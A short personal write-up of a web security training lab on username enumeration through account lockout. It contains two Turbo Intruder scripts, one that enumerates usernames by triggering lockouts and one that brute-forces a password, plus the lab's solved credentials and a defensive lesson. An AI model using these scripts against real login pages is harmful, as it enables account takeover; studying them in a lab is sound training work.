# Lab: 
Username enumeration via account lock

# Overview
This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 

# Idea:
- Use Turbo Intruder to log in each username multiple times
- The one that has different response(You have made too many incorrect login attempts. Please try again in 1 minute(s).) is the valid username (answer: ad)
- Now we need to find out the logic flaw to bypass the blocked
- Use Turbo Intruder to brute force attack with username ad, after that we can see one line is diffirent from the other(not response blocked notice).
- So this is the correct password (password: pass)

# Turbo Intruder Code
- First code to enumerate valid username:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=5,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    with open("/home/duong/username.txt", "r") as f:
        username = [line.strip() for line in f if line.strip()]
    password = ['peter1', 'peter2', 'peter3', 'peter4', 'peter5']
    for u in username:
        for p in password:
            engine.queue(target.req, [u, p])
def handleResponse(req, interesting):
    table.add(req)

- Second code to brute force password:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=10,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    
    with open("/home/duong/password.txt", "r") as f:
        password = [line.strip() for line in f if line.strip()]
    for p in password:
        engine.queue(target.req, [p])
def handleResponse(req, interesting):
    table.add(req)

# Learned:
- Flawed Logic of this lab is the diffirent responses in diffirent cases makes attackers can identify credential info
- Defensive perspect: The server must return exactly the same response in every case